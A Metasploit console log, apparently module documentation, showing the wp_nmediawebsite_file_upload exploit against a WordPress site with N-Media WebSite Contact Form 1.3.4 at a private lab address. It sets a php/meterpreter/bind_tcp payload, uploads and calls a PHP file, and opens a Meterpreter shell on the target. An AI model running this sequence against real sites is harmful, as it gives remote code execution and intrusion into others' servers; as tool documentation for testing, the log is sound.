@@ -1,0 +1,97 @@
+ahmer@ubuntu:~$ msfconsole
+msf5 exploit(unix/webapp/wp_creativecontactform_file_upload) > use exploit/unix/webapp/wp_nmediawebsite_file_upload
+msf5 exploit(unix/webapp/wp_nmediawebsite_file_upload) > show advanced options
+
+Module advanced options (exploit/unix/webapp/wp_nmediawebsite_file_upload):
+
+   Name                    Current Setting                                     Required  Description
+   ----                    ---------------                                     --------  -----------
+   ContextInformationFile                                                      no        The information file that contains context information
+   DOMAIN                  WORKSTATION                                         yes       The domain to use for windows authentification
+   DigestAuthIIS           true                                                no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers
+   DisablePayloadHandler   false                                               no        Disable the handler code for the selected payload
+   EnableContextEncoding   false                                               no        Use transient context when encoding payloads
+   FileDropperDelay                                                            no        Delay in seconds before attempting cleanup
+   FingerprintCheck        true                                                no        Conduct a pre-exploit fingerprint verification
+   HttpClientTimeout                                                           no        HTTP connection and receive timeout
+   HttpPassword                                                                no        The HTTP password to specify for authentication
+   HttpTrace               false                                               no        Show the raw HTTP requests and responses
+   HttpUsername                                                                no        The HTTP username to specify for authentication
+   SSLVersion              Auto                                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL2, SSL3, TLS1, TLS1.1, TLS1.2)
+   UserAgent               Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  no        The User-Agent header to use for all requests
+   VERBOSE                 false                                               no        Enable detailed status messages
+   WORKSPACE                                                                   no        Specify the workspace for this module
+   WPCHECK                 true                                                yes       Check if the website is a valid WordPress install
+   WPCONTENTDIR            wp-content                                          yes       The name of the wp-content directory
+   WfsDelay                0                                                   no        Additional delay when waiting for a session
+
+
+Module options (exploit/unix/webapp/wp_nmediawebsite_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   N-Media WebSite Contact Form 1.3.4
+
+
+msf5 exploit(unix/webapp/wp_nmediawebsite_file_upload) > set targeturi /wp
+targeturi => /wp
+msf5 exploit(unix/webapp/wp_nmediawebsite_file_upload) > set payload php/meterpreter/bind_tcp
+payload => php/meterpreter/bind_tcp
+msf5 exploit(unix/webapp/wp_nmediawebsite_file_upload) > set rhost 192.168.13.66
+rhost => 192.168.13.66
+msf5 exploit(unix/webapp/wp_nmediawebsite_file_upload) > show options
+
+Module options (exploit/unix/webapp/wp_nmediawebsite_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.13.66    yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /wp              yes       The base path to the wordpress application
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       The listen port
+   RHOST  192.168.13.66    no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   N-Media WebSite Contact Form 1.3.4
+
+
+msf5 exploit(unix/webapp/wp_nmediawebsite_file_upload) > exploit
+
+[+] Our payload is at: 1562971076-DgslEQ.php. Calling payload...
+[*] Calling payload...
+[*] Started bind TCP handler against 192.168.13.66:4444
+[*] Sending stage (38247 bytes) to 192.168.13.66
+[*] Meterpreter session 1 opened (10.0.13.10:33511 -> 192.168.13.66:4444) at 2019-07-12 15:38:19 -0700
+[!] This exploit may require manual cleanup of '1562971076-DgslEQ.php' on the target
+
+meterpreter > 
+[+] Deleted 1562971076-DgslEQ.php
+
+meterpreter > pwd
+/var/lib/wordpress/wp-content/uploads/contact_files
+meterpreter > 
